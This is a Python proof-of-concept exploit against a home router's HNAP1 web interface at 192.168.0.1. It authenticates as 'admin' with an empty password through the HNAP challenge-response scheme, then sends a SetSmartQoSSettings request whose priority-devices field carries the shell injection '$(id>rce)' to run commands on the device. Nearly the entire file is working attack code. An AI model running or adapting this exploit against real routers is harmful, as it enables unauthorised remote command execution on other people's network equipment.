import requests
import hmac
import hashlib
import json
import json
import time


class HNAPObject:
    
    def toString(self):
        return json.dumps({})

class SetSmartQoSSettings(HNAPObject):
    
    def __init__(self, smartqos_downstream_shapingrate, smartqos_enable, smartqos_express_devices, smartqos_normal_devices, smartqos_priority_devices, smartqos_type, smartqos_upstream_shapingrate) -> None:
        super().__init__()
        self.smartqos_downstream_shapingrate = smartqos_downstream_shapingrate
        self.smartqos_enable = smartqos_enable
        self.smartqos_express_devices = smartqos_express_devices
        self.smartqos_normal_devices = smartqos_normal_devices
        self.smartqos_priority_devices = smartqos_priority_devices
        self.smartqos_type = smartqos_type
        self.smartqos_upstream_shapingrate = smartqos_upstream_shapingrate
    
    def toString(self):
        return json.dumps({"SetSmartQoSSettings": {"smartqos_downstream_shapingrate": self.smartqos_downstream_shapingrate, "smartqos_enable": self.smartqos_enable, "smartqos_express_devices": self.smartqos_express_devices, "smartqos_normal_devices": self.smartqos_normal_devices, "smartqos_priority_devices": self.smartqos_priority_devices, "smartqos_type": self.smartqos_type, "smartqos_upstream_shapingrate": self.smartqos_upstream_shapingrate}})
    

def make_hnap_json_request(action: str, hanpobject: HNAPObject):
    url = f"http://192.168.0.1:80/HNAP1/"
    current_timestamp = int(time.time())
    auth = hmac.new(b'withoutloginkey', (str(current_timestamp) + "\"http://purenetworks.com/HNAP1/Login\"").encode(), hashlib.md5).hexdigest().upper()
    cookies = {"PHPSESSID": "5c6805e3bb7bc8aa84db22198cfffd3e"}
    headers = {"Accept": "application/json, text/javascript, */*; q=0.01", "X-Requested-With": "XMLHttpRequest", f"HNAP_AUTH": "{auth} {current_timestamp}", "SOAPAction": "\"http://purenetworks.com/HNAP1/Login\"", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36", "Content-Type": "application/json; charset=UTF-8", "Origin": "http://192.168.0.1", "Accept-Encoding": "gzip, deflate, br", "Connection": "close"}
    json1={"Login": {"Action": "request", "Captcha": "", "LoginPassword": "", "PrivateLogin": "LoginPassword", "Username": "admin"}}
    r = requests.post(url, headers=headers, cookies=cookies, json=json1)
    jason = json.loads(r.text)

    print(r.text)

    publickey = jason["LoginResponse"]["PublicKey"]
    challenge = jason["LoginResponse"]["Challenge"]
    cookies = jason["LoginResponse"]["Cookie"]
    
    print("Public Key: " + publickey)
    print("Challenge: " + challenge)
    print("Cookie: " + cookies)

    private_key = hashlib.md5()
    private_key.update((publickey + "" + challenge).encode())

    p_key = private_key.hexdigest().upper()
    loginpassword = hashlib.md5()
    loginpassword.update((p_key + challenge).encode())
    url = f"http://192.168.0.1:80/HNAP1/"
    cookies = {"PHPSESSID": "5c6805e3bb7bc8aa84db22198cfffd3e", "uid": str(cookies), "PrivateKey": str(p_key)}
    current_timestamp = int(time.time())
    print(current_timestamp)
    auth = hmac.new(str(p_key).encode(), (str(current_timestamp) + "\"http://purenetworks.com/HNAP1/Login\"").encode(), hashlib.md5).hexdigest().upper()
    print("Auth: " + auth)
    print("Login Password: " + loginpassword.hexdigest().upper())
    headers = {"Accept": "application/json, text/javascript, */*; q=0.01", "X-Requested-With": "XMLHttpRequest", "HNAP_AUTH": f"{auth} {current_timestamp}", "SOAPAction": "\"http://purenetworks.com/HNAP1/Login\"", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36", "Content-Type": "application/json; charset=UTF-8", "Origin": "http://192.168.0.1", "Accept-Encoding": "gzip, deflate, br", "Connection": "close"}
    json1={"Login": {"Action": "login", "Captcha": "", "LoginPassword": str(loginpassword.hexdigest().upper()), "PrivateLogin": "LoginPassword", "Username": "admin"}}
    r=requests.post(url, headers=headers, cookies=cookies, json=json1)
    jason = json.loads(r.text)
    status = jason['LoginResponse']['LoginResult']
    if status == 'OK':
        url = f"http://192.168.0.1:80/HNAP1/"
        current_timestamp = int(time.time())
        auth = hmac.new(str(cookies).encode(), (str(current_timestamp) + f"\"http://purenetworks.com/HNAP1/{action}\"").encode(), hashlib.md5).hexdigest().upper()
        headers = {"Accept": "application/json", "HNAP_AUTH": f"{auth} {current_timestamp}", "SOAPACTION": f"\"http://purenetworks.com/HNAP1/{action}\"", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36", "Content-Type": "application/json", "Origin": "http://192.168.0.1", "Accept-Encoding": "gzip, deflate, br", "Connection": "close"}
        r=requests.post(url, headers=headers, cookies=cookies, data=hanpobject.toString())


if __name__ == "__main__":
    hnapObject = SetSmartQoSSettings(smartqos_downstream_shapingrate="5459968", smartqos_enable="1", smartqos_express_devices="", smartqos_normal_devices="", smartqos_priority_devices=f"$(id>rce)", smartqos_type="by_device", smartqos_upstream_shapingrate="909312")
    make_hnap_json_request("SetSmartQoSSettings", hnapObject)